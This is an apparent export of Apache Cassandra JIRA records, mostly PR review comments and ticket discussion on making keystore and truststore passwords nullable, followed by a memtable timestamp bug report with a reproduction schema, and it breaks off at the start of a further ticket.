##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   @smiklosovic any comments before we can close this?



;12/Apr/23 23:48;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1165180776


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   Aha, this is great catch. Yes we should not have them explicitly written there. Just comment it out and leave ""cassandra"" as password there to have some hint what to put there so people have easy job. ""cassandra"" password is used sometimes during testing etc, some testing clusters just have ""cassandra"" password for their certs / keys, same as they have ""cassandra"" password by default for CQL when using PasswordAuthenticator.



;13/Apr/23 08:24;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1165187331


##########
NEWS.txt:
##########
@@ -150,6 +150,10 @@ Upgrading
      to TimeWindowCompactionStrategy before upgrading to this version.
    - The deprecated functions `dateOf` and `unixTimestampOf` have been removed. They were deprecated and replaced by
      `toTimestamp` and `toUnixTimestamp` in Cassandra 2.2.
+   - Keystore password configuration is nullable now and the code defaults of the keystore passwords to 'cassandra' are

Review Comment:
   @maulin-vasavada we should mention keystore as well as truststore passwords here. It would be also nice to mention what section these configuration parameters are found in.



;13/Apr/23 08:29;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1165180776


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   Aha, this is great catch. Yes we should not have them explicitly written there. Just comment it out and leave ""cassandra"" as password there to have some hint what to put there so people have easy job. ""cassandra"" password is used sometimes during testing etc, some testing clusters just have ""cassandra"" password for their certs / keys, same as they have ""cassandra"" password by default for CQL when using PasswordAuthenticator.
   
   If somebody is going to uncomment a password which has ""cassandra"" as default, it will be explicitly obvious to him and maybe people will think twice if it is a good idea to have a password like that.



;13/Apr/23 08:43;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1165180776


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   But if we leave it here uncommented, we also do not break existing configurations which are depending on it.
   
   It is about ""not breaking what is there"". If we change this, all deployments which rely on the default will stop to work because set it to null suddenly.
   
   It more about the _possibility_ to set it to null if one really wants rather than setting it by default to null and breaking it where it relies on not null (even it is ""cassandra"" as default).
   
   People who are (and should) use stronger password have to set them explicitly anyway and they do not have this problem.



;13/Apr/23 09:15;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1165180776


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   But if we leave it here uncommented, we also do not break existing configurations which are depending on it.
   
   It is about ""not breaking what is there"". If we change this, all deployments which rely on the default will stop to work because we set it to null suddenly.
   
   It more about the _possibility_ to set it to null if one really wants rather than setting it by default to null and breaking it where it relies on not null (even it is ""cassandra"" as default).
   
   People who are (and should) use stronger password have to set them explicitly anyway and they do not have this problem.



##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   But if we leave it here uncommented, we also do not break existing configurations which are depending on it.
   
   It is about ""not breaking what is there"". If we change this, all deployments which rely on the default will stop to work because we set it to null suddenly.
   
   It is more about the _possibility_ to set it to null if one really wants rather than setting it by default to null and breaking it where it relies on not null (even it is ""cassandra"" as default).
   
   People who are (and should) use stronger password have to set them explicitly anyway and they do not have this problem.



;13/Apr/23 09:16;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1165180776


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   But if we leave it here uncommented, we also do not break existing configurations which are depending on it.
   
   It is about ""not breaking what is there"". If we change this, all deployments which rely on the default will stop to work because we set it to null suddenly.
   
   It is more about the _possibility_ to set it to null if one really wants that rather than setting it by default to null and breaking it where it relies on not null (even it is ""cassandra"" as default).
   
   People who are (and should) use stronger password have to set them explicitly anyway and they do not have this problem.



;13/Apr/23 09:16;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1165180776


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   
   
   @maedhroz  @maulin-vasavada 
   
   But if we leave it here uncommented, we also do not break existing configurations which are depending on it.
   
   It is about ""not breaking what is there"". If we change this, all deployments which rely on the default will stop to work because we set it to null suddenly.
   
   It is more about the _possibility_ to set it to null if one really wants that rather than setting it by default to null and break it everywhere it relies on not null (even it is ""cassandra"" as default).
   
   People who are (and should) use stronger passwords have to set them explicitly anyway and they do not have this problem.



;13/Apr/23 09:17;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1165180776


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   
   
   @maedhroz  @maulin-vasavada 
   
   But if we leave it here uncommented, we also do not break existing configurations which are depending on it.
   
   It is about ""not breaking what is there"". If we change this, all deployments which rely on the default will stop to work because we set it to null suddenly.
   
   It is more about the _possibility_ to set it to null if one really wants that rather than setting it by default to null and break it everywhere it relies on not null (even it is ""cassandra"" as default).
   
   People who are (and should) use stronger passwords have to set them explicitly anyway and they do not have this problem.
   
   If this goes to 4.1 as well and not to 5, people might be quite surprised that this will not work. Having it changed in 5.0 is probably OK but still ... 



;13/Apr/23 09:18;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1165180776


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   
   
   @maedhroz  @maulin-vasavada 
   
   But if we leave it here uncommented, we also do not break existing configurations which are depending on it.
   
   It is about ""not breaking what is there"". If we change this, all deployments which rely on the default will stop to work because we set it to null suddenly.
   
   It is more about the _possibility_ to set it to null if one really wants that rather than setting it by default to null and break it everywhere it relies on not null (even it is ""cassandra"" as default).
   
   People who are (and should) use stronger passwords have to set them explicitly anyway and they do not have this problem.
   
   If this goes to 4.1 as well, people might be quite surprised that this will not work between stupid version bump in a patch release. Having it changed in 5.0 is probably OK but still ... 



;13/Apr/23 09:20;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1165180776


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   
   
   @maedhroz  @maulin-vasavada 
   
   But if we leave it here uncommented, we also do not break existing configurations which are depending on it.
   
   It is about ""not breaking what is there"". If we change this, all deployments which rely on the default will stop to work because we set it to null suddenly.
   
   It is more about the _possibility_ to set it to null if one really wants that rather than setting it by default to null and break it everywhere it relies on not null (even it is ""cassandra"" as default).
   
   People who are (and should) use stronger passwords have to set them explicitly anyway and they do not have this problem.
   
   If this goes to 4.1 as well, people might be quite surprised that this will not work between stupid version bump in a patch release. Having it changed in 5.0 is probably OK but still ... 
   
   So, I would leave it uncommented in 4.1 but I would comment it in 5.0.
   
   That way we do not break patch release bump but we still educate users that there is no magic default for them in 5.0 and they should set it all explicitly. 



;13/Apr/23 09:22;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1165180776


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   
   
   @maedhroz  @maulin-vasavada 
   
   But if we leave it here uncommented, we also do not break existing configurations which are depending on it.
   
   It is about ""not breaking what is there"". If we change this, all deployments which rely on the default will stop to work because we set it to null suddenly.
   
   It is more about the _possibility_ to set it to null if one really wants that rather than setting it by default to null and break it everywhere it relies on not null (even it is ""cassandra"" as default).
   
   People who are (and should) using stronger passwords have to set them explicitly anyway and they do not have this problem.
   
   If this goes to 4.1 as well, people might be quite surprised that this will not work between stupid version bump in a patch release. Having it changed in 5.0 is probably OK but still ... 
   
   So, I would leave it uncommented in 4.1 but I would comment it in 5.0.
   
   That way we do not break patch release bump but we still educate users that there is no magic default for them in 5.0 and they should set it all explicitly. 



;13/Apr/23 09:23;githubbot;600","maedhroz commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1165766296


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   That works for me.



;13/Apr/23 16:21;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1166081761


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   Cool. So @smiklosovic and @maedhroz I have [a separate PR](https://github.com/apache/cassandra/pull/2273) for the 4.1 backport and in this PR I can comment out the password configuration from the cassandra yaml since this will be target for 5.0 release. Please let me know if that understanding is correct. 



;13/Apr/23 22:19;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1166090662


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   Done commenting out the passwords in the cassandra yaml in this PR.



;13/Apr/23 22:36;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1166091022


##########
NEWS.txt:
##########
@@ -150,6 +150,10 @@ Upgrading
      to TimeWindowCompactionStrategy before upgrading to this version.
    - The deprecated functions `dateOf` and `unixTimestampOf` have been removed. They were deprecated and replaced by
      `toTimestamp` and `toUnixTimestamp` in Cassandra 2.2.
+   - Keystore password configuration is nullable now and the code defaults of the keystore passwords to 'cassandra' are

Review Comment:
   done



;13/Apr/23 22:36;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1166636989


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   thank you, I will take a look shortly. Thanks for the patience.



;14/Apr/23 10:07;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1166660121


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   @maulin-vasavada looks good, please apply what was discussed here in 4.1 branch and we can finally ship it.



;14/Apr/23 10:27;githubbot;600","smiklosovic commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1166660121


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   @maulin-vasavada looks good, please apply what was discussed here in 4.1 branch and we can finally ship it.
   
   EDIT: Actually, we do not need to do anything for 4.1 in NEWS because we effectively have not changed anything. Upgrades will be working as before.
   
   So I think we are done.



;14/Apr/23 10:29;githubbot;600","maulin-vasavada commented on code in PR #2253:
URL: https://github.com/apache/cassandra/pull/2253#discussion_r1167308696


##########
conf/cassandra.yaml:
##########
@@ -1362,6 +1362,11 @@ server_encryption_options:
   # Set to a valid keystore if internode_encryption is dc, rack or all
   keystore: conf/.keystore
   keystore_password: cassandra

Review Comment:
   Cool thanks @smiklosovic I've the backported changes for 4.1 [here in a different PR](https://github.com/apache/cassandra/pull/2273). Will remove news.txt update from there. Thanks for helping.



;14/Apr/23 22:16;githubbot;600","smiklosovic closed pull request #2253: CASSANDRA-18124 Make keystore_password nullable
URL: https://github.com/apache/cassandra/pull/2253


;17/Apr/23 09:15;githubbot;600","smiklosovic closed pull request #2268: CASSANDRA-18124 4.1
URL: https://github.com/apache/cassandra/pull/2268


;17/Apr/23 09:15;githubbot;600","smiklosovic closed pull request #2273: Backport changes for CASSANDRA-18124
URL: https://github.com/apache/cassandra/pull/2273


;17/Apr/23 09:15;githubbot;600",,,,,,,,,,,,,,0,40200,,,0,40200,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17031,,,,,,,,,,,,,,,,,,,,0.0,maulin.vasavada,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Apr 17 17:14:43 UTC 2023,,,,,,,All,,,,"0|z1e5fk:",9223372036854775807,,,,maedhroz,smiklosovic,,,Normal,,4.0.0,,https://github.com/apache/cassandra/commit/bd49f6ff265c8bfa64bf140328ae6736dc4a87bd,,,,,,,,,CI,,,,,"16/Dec/22 15:11;e.dimitrova;CC [~maulin.vasavada], [~stefan.miklosovic] and [~jonmeredith] 

If we want to allow the null value we need to mark the parameter with @Nullable in the codebase as the default value is not null 

 ;;;","17/Dec/22 04:32;frankgh;[~e.dimitrova] I've encountered this issue recently, and might have a patch around. I can submit a fix, as you mention we need to mark the param with {{@Nullable}};;;","19/Dec/22 01:53;e.dimitrova;[~frankgh] Sure, it would be great if you already have it with the tests, etc. Thank you!;;;","19/Dec/22 06:58;rtib;The use and default value of {{truststore_password}} should also be reviewed in order to avoid startup warnings like:
{code}
PEMBasedSslContextFactory.java:125 - PEM based truststore should not be using password. Ignoring the given value in 'truststore_password' configuration.
{code}
;;;","25/Feb/23 01:20;maulin.vasavada;SO [~frankgh] Did we make any progress on this? Do you want my help on anything? ;;;","09/Mar/23 10:10;smiklosovic;Any progress? [~maulin.vasavada]  [~frankgh] 

It would be great if this is not forgotten.;;;","10/Mar/23 00:39;maulin.vasavada;[~smiklosovic] I'll take this. Sorry last couple of weeks have been crazy.;;;","10/Mar/23 00:40;maulin.vasavada;One question- Since the trunk was broken for example/ssl-factory, what should be the base I. can use to build for this if the trunk is still broken?;;;","10/Mar/23 00:58;brandon.williams;I think you should base this patch off of 4.1 and trunk, regardless of other tickets.;;;","10/Mar/23 01:01;frankgh;Thanks [~maulin.vasavada]. I won't be able to get to this for at least a couple of weeks.;;;","10/Mar/23 20:34;maulin.vasavada;Thanks [~brandon.williams] . [~smiklosovic] While modifying the code to allow null password configuration for the PEM I am running into a challenge due to the default logic to fallback to `keystore_password` configuration in case `key_password` configuration (created for the PEM) is null/missing. Due to that fallback logic we have to change default for the `keystore_password` also to be null (specifically in EncryptionOptions.java). I think we have two options-
 # Drop the fallback logic reading the `keystore_password` in case of PEM keys.
 ## This fallback logic was done primarily to support a use-case for PEM keys provided in a file with existing `keystore` configuration in which case it also makes sense to continue read the key password from the `keystore_password`configuration.
 # Make `keystore_password` nullable configuration which means removing the default value injected by EncryptionOptions.java
 ## I think we can make this nullable since practically operators might not have JKS keystores without the passwords except for a missed-configuration use-case AND for PEM it makes perfect sense to allow null password for the unencrypted keys.
 ## However, since we are changing the default for an older configuration, we have to give more thoughts on its effect on existing systems.

Let me see what 2nd option entails (in terms of tests etc) while you provide you thoughts on this.;;;","11/Mar/23 01:17;maulin.vasavada;So far it looks like 1st option is more convoluted. 2nd option is much cleaner and simple changes. If we fail to provide `keystore_password` for the JKS, it will fail with the new changes (throws NPE since the FileBasedSslContextFactory.java doesn't expect null for the password). I can add validation in the FileBasedSslContextFactory for the null keystore password to avoid NPE.;;;","13/Mar/23 11:33;smiklosovic;I guess the second approach is fine. Hard to tell without having the code to see the changes. Would you mind to prepare a PR for your 2nd idea?;;;","13/Mar/23 20:04;maulin.vasavada;Sure, soon enough. I was on instaclustr branch (inherited from the other issue's discussion). I can quickly raise a PR there while I work on the 4.1 patch as per Brandon's suggestion.;;;","14/Mar/23 00:32;maulin.vasavada;[~smiklosovic] Here you go [-https://github.com/apache/cassandra/pull/2225-];;;","18/Mar/23 14:53;smiklosovic;Thank you very much, [~maulin.vasavada]!

[~rtib] do you have any capacity to try the above pull request and verify it all works for you as well?;;;","22/Mar/23 10:09;rtib;Sorry for the delay, I was busy the last few days. Of course, I'll have a look and test it.;;;","23/Mar/23 07:38;rtib;I've tested it, looks good. I haven't tested with intermediate CA certificates for now, but that wasn't the issue either.

One small suggestion: currently the configuration example can only be found on the website, would you mind to put configuration examples using PEMBasedSslContextFactory into the comments of cassandra.yaml? That would lower the setup threshold.;;;","23/Mar/23 08:28;rtib;One minor issue: nodetool is complaining about configuration
{code}
% bin/nodetool stopdaemon
WARN  08:50:50,063 Only 20,213GiB free across all data volumes. Consider adding more capacity to your cluster or removing obsolete snapshots
WARN  08:50:50,566 'keystore_password' and 'key_password' both are configured but since the values match it's okay. Ideally you should only specify one of them.
WARN  08:50:50,567 'keystore_password' and 'key_password' both are configured but since the values match it's okay. Ideally you should only specify one of them.
Cassandra has shutdown.
{code}
;;;","23/Mar/23 21:37;maulin.vasavada;Thanks [~rtib] for the review. I can update the cassandra yaml to have the PEM example in comments. Also I'll try to check on the Nodetool output. I fixed the issue of getting truststore warning for the PEM and made truststore password also nullable but this warning I need to check. Earlier it came because of defaults and the fallback of `key_password` to `keystore_password` in the absence of the prior, now it could be the same reason.

 

One option is - avoid logging a warning in case both the values are same since technically it doesn't create any issue ONLY in case they are different we should log a warning. What do you think?

 

Meanwhile [~smiklosovic] can we get any additional PR reviews to have more eyes on this ?;;;","24/Mar/23 07:16;rtib;My opinion concerning the warnings is, that your approach of changing the warning logic is fine and the only suitable way for 4.1.x.

In 5.x however, the legacy configuration parameter should be removed, along with the whole code to generate these warnings. But that's a different issue and I don't know about a ticket for that.;;;","29/Mar/23 19:05;maulin.vasavada;Hi [~rtib] and [~smiklosovic] I made changes suggested above and on the PR for the formatting fix. Raised a new PR, since I wanted to make sure I can see the formatting changes clearly. Can you please test/review [https://github.com/apache/cassandra/pull/2253] ? Thanks.;;;","29/Mar/23 19:15;smiklosovic;Thank you for your perseverance, [~maulin.vasavada]. I may take a look. We still need the second reviewer / committer, though. I ll ask around.;;;","31/Mar/23 00:14;maulin.vasavada;Hi [~rtib] Please confirm with the latest PR if the changes look good based on your testing. [~smiklosovic] I've resolved your comment on the PR, let me know if you want me to start the circleCI or you would kick it off. Thanks;;;","31/Mar/23 16:20;smiklosovic;j8 precommit looks good https://app.circleci.com/pipelines/github/instaclustr/cassandra/2043/workflows/058d0781-13f9-45f0-9343-b6b84d6f4485

j11 precommit too https://app.circleci.com/pipelines/github/instaclustr/cassandra/2043/workflows/dcd865fa-7332-47cc-ba60-cb2ee1f18024

I have also tested example and tests pass.

[~rtib] is that still all good for you? I then have to look for another committer.;;;","01/Apr/23 07:16;rtib;LGTM, thank you.;;;","03/Apr/23 20:04;smiklosovic;I am looking for a reviewer. Builds make sense as well as the change. A user reports it looks good for him. I tested the example manually too. 

[~e.dimitrova], [~brandon.williams] [~maedhroz]

branch https://github.com/apache/cassandra/pull/2253
j8 precommit https://app.circleci.com/pipelines/github/instaclustr/cassandra/2043/workflows/058d0781-13f9-45f0-9343-b6b84d6f4485
j11 precommit https://app.circleci.com/pipelines/github/instaclustr/cassandra/2043/workflows/dcd865fa-7332-47cc-ba60-cb2ee1f18024;;;","04/Apr/23 20:13;maedhroz;I'll take a look...;;;","05/Apr/23 15:42;maedhroz;+1 (w/ some minor conversations to wrap up in the PR)

 

The two test failures that popped up are a timeout and a 2i building failure, neither of which have anything to do w/ this patch.;;;","10/Apr/23 16:22;maedhroz;Does this still need a committer?;;;","10/Apr/23 19:27;smiklosovic;[~maulin.vasavada] is this applicable to 4.1? I was trying to cherry-pick that but it I was getting conflicts. Was there something done in trunk since 4.1 so this is not nicely applicable to 4.1?

I am OK with committing only to trunk if it is too much work.

This stuff seems to add new things https://issues.apache.org/jira/browse/CASSANDRA-17513;;;","10/Apr/23 20:40;maulin.vasavada;[~smiklosovic] This might have conflict with 4.1 because the trunk's compilation on examples/ssl-factory was broken and originally you fixed it in your branch and I picked up the same changes in my PR. I made sure in my PR I have a separate commit just to fix that compilation issue on the trunk to clearly see what was needed for that vs my actual intended changes for this ticket.

 

Yes based on CASSANDRA-17513 changes the examples/ssl-factory needed to have the changes it didn't have I think.;;;","10/Apr/23 20:43;maulin.vasavada;[~maedhroz] I'll modify the NEWS.txt as per the PR suggestion. I got distracted due to 2023 IntelliJ forced update that killed my workspace (still broken) but the NEWS.txt change doesn't depend on my workspace's stability so I can make it separately.;;;","10/Apr/23 20:49;smiklosovic;I tried to backport it here https://github.com/instaclustr/cassandra/commit/943bf9824387e60a5a30745508d6b8a869e5607e

I ll build it soonish. Could you go through that if you have 10 mins?

https://github.com/apache/cassandra/pull/2268;;;","10/Apr/23 23:46;maulin.vasavada;[~smiklosovic] Finally I got my IntelliJ 2023 working! Let me know if you want me to backport to 4.1. 

 

[~maedhroz] I added a note in the NEWS.txt, please review and see if you have any comments.;;;","11/Apr/23 07:20;smiklosovic;[~maulin.vasavada] it would be great if you prepared the patch for 4.1 as well.;;;","11/Apr/23 16:19;maedhroz;Added a couple last comments to the PR. Let me know if those make sense...;;;","11/Apr/23 19:52;maulin.vasavada;Will prepare 4.1 patch and picked-up Caleb's suggestions on the NEWS.txt. Now I guess one comment left to be resolved. It shows conflict for NEWS.txt with trunk so I'd have to take the latest copy and reapply the latest changes on it once we close on all the comments.;;;","12/Apr/23 23:13;maulin.vasavada;[~smiklosovic] I prepared the backport for this ticket for 4.1 branch. Please review [this PR-2273|https://github.com/apache/cassandra/pull/2273];;;","15/Apr/23 13:40;smiklosovic;4.1 j8 pre-commit https://app.circleci.com/pipelines/github/instaclustr/cassandra/2079/workflows/1b38f1ca-83c2-4670-91fd-1d438974deef
4.1 j11 pre-commit https://app.circleci.com/pipelines/github/instaclustr/cassandra/2079/workflows/8c42e4dc-06f8-4d9e-acc5-a6fb7dc27800

trunk j8 pre-commit https://app.circleci.com/pipelines/github/instaclustr/cassandra/2080/workflows/f02a1089-b95f-4284-895d-73fbdbc63f8c
trunk j11 pre-commit https://app.circleci.com/pipelines/github/instaclustr/cassandra/2080/workflows/a560d634-2596-4954-8486-87764efaee0d

all failing tests are known / are flaky

4.1 branch / commit https://github.com/instaclustr/cassandra/commit/bd49f6ff265c8bfa64bf140328ae6736dc4a87bd
trunk branch / commit https://github.com/instaclustr/cassandra/commit/c67b8691e0e32ad9133a5295bc2f9d756dd0541c

I just took what was there from Maulin and squashed it and rebased.

Both 4.1 and trunk example in examples/ssl-factory work.

CI also contains multiplexer jobs for modified / added tests.

[~maedhroz] I am +1, are you too? I have to ask!;;;","15/Apr/23 15:10;maedhroz;+1;;;","17/Apr/23 17:14;maulin.vasavada;Thank you both [~smiklosovic] and [~maedhroz] ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,
Do not leak 2015 memtable synthetic Epoch,CASSANDRA-18118,13514014,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,bereng,bereng,15/Dec/22 08:41,12/Jan/23 07:26,13/Jul/23 08:40,12/Jan/23 07:26,3.11.15,4.0.8,4.1.1,5.0,,,Local/Memtable,,,,0,,"This [Epoch|https://github.com/apache/cassandra/blob/cassandra-3.11/src/java/org/apache/cassandra/db/rows/EncodingStats.java#L48] can [leak|https://github.com/apache/cassandra/blob/cassandra-3.11/src/java/org/apache/cassandra/db/Memtable.java#L392] affecting all the timestamps logic.  It has been observed in a production env it can i.e. prevent proper sstable and tombstone cleanup.

To reproduce create the following table:
{noformat}
drop keyspace test;
create keyspace test WITH replication = {'class':'SimpleStrategy', 'replication_factor' : 1};
CREATE TABLE test.test (
    key text PRIMARY KEY,
    id text
) WITH bloom_filter_fp_chance = 0.01
    AND caching = {'keys': 'ALL', 'rows_per_partition': 'NONE'}
    AND comment = ''
    AND compaction = {'class': 'org.apache.cassandra.db.compaction.SizeTieredCompactionStrategy', 'max_threshold': '32', 'min_threshold': '2', 'tombstone_compaction_interval': '3000', 'tombstone_threshold': '0.1', 'unchecked_tombstone_compaction': 'true'}
    AND compression = {'chunk_length_in_kb': '64', 'class': 'org.apache.cassandra.io.compress.LZ4Compressor'}
    AND crc_check_chance = 1.0
    AND dclocal_read_repair_chance = 0.0
    AND default_time_to_live = 10
    AND gc_grace_seconds = 10
    AND max_index_interval = 2048
    AND memtable_flush_period_in_ms = 0
    AND min_index_interval = 128
    AND read_repair_chance = 0.0
    AND speculative_retry = '99PERCENTILE';

CREATE INDEX id_idx ON test.test (id);
{noformat}

And stress load it with:
{noformat}
insert into test.test (key,id) values('$RANDOM_UUID $RANDOM_UUID', 'eaca36a1-45f1-469c-a3f6-3ba54220363f') USING TTL 10
{noformat}

Notice how all inserts have a 10s TTL, the default 10s TTL and gc_grace is also at 10s. This is to speed up the repro:
- Run the load for a couple minutes and track sstables disk usage. You will see it does only increase, nothing gets cleaned up and it doesn't stop growing (notice all this is well past the 10s gc_grace and TTL)
- Running a flush and a compaction while under load against the keyspace, table or index doesn't solve the issue.
- Stopping the load and running a compaction doesn't solve the issue. Flushing does though.
- On the original observation where TTL was around 600s and gc_grace around 1800s we could get GBs of sstables that weren't cleaned up or compacted away after hours of work.
- Reproduction can also happen on plain sstables by repeatedly inserting/deleting/overwriting the same values over and over again without 2i indices or TTL being involved.

The problem seems to be [EncodingStats|https://github.com/apache/cassandra/blob/cassandra-3.11/src/java/org/apache/cassandra/db/rows/EncodingStats.java#L48] using a synthetic Epoch in 2015 which plays nice with Vint serialization.  Unfortunately {{Memtable}} is using that to keep track of the {{minTimestamp}} which can leak the 2015 Epoch. This confuses any logic consuming that timestamp. In this particular case purge and fully expired sstables weren't properly detected.
",,bereng,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Jan 12 07:26:43 UTC 2023,,,,,,,All,,,,"0|z1e42o:",9223372036854775807,,,,maedhroz,,,,Normal,,3.11.11,,https://github.com/apache/cassandra/commit/b8a87abba47441d97b3c85a0473d02919e1c071b,,,,,,,,,See PR,,,,,"10/Jan/23 21:23;maedhroz;3.11 PR looks good, modulo one minor nit;;;","11/Jan/23 09:21;bereng;[~maedhroz] I have added the rest of the PRs:
- 3.x Notice a new instance of the same problem that had went under the radar.
- 4.1 onwards: Same approach but adapted to the new layout of the code;;;","11/Jan/23 22:01;maedhroz;+1 on all PRs

Thanks for the patches!;;;","12/Jan/23 07:26;bereng;Thx for the review!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Blog article contains outdated parameter,CASSANDRA-18117,13513593,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
